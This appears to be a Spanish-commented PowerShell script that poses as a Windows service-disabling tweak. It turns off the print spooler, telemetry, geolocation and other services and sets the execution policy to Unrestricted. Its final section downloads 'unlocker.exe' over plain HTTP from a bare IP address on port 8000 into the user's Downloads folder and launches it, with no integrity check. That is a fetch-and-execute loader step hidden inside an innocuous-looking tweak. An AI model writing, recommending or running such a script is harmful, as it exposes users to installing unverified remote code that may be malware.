Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force

# Deshabilitar el Administrador de autenticación de Xbox Live
Set-Service -Name "XblAuthManager" -StartupType Disabled

# Deshabilitar el Administrador de conexiones de acceso remoto
Set-Service -Name "RasMan" -StartupType Disabled

# Detener y deshabilitar la Cola de impresión
Stop-Service -Name "Spooler"
Set-Service -Name "Spooler" -StartupType Disabled

# Deshabilitar el servicio Fax
Set-Service -Name "Fax" -StartupType Disabled

# Deshabilitar la Experiencia de usuario y telemetría asociadas
Set-Service -Name "DiagTrack" -StartupType Disabled
Set-Service -Name "dmwappushservice" -StartupType Disabled

# Deshabilitar el Servicio de geolocalización
Set-Service -Name "lfsvc" -StartupType Disabled

Write-Host "Se han deshabilitado los servicios especificados."

# Obtener la ruta de descargas del usuario actual
$downloadPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('UserProfile'), 'Downloads\unlocker.exe')

# Descargar el archivo desde la URL proporcionada
Invoke-WebRequest -Uri 'http://20.125.139.193:8000/unlocker.exe' -OutFile $downloadPath

# Verificar si la descarga se completó
if (Test-Path $downloadPath) {
    # Ejecutar el archivo descargado (se necesita confirmación del usuario)
    Start-Process -FilePath $downloadPath
} else {
    Write-Host "La descarga falló. No se pudo encontrar el archivo."
}
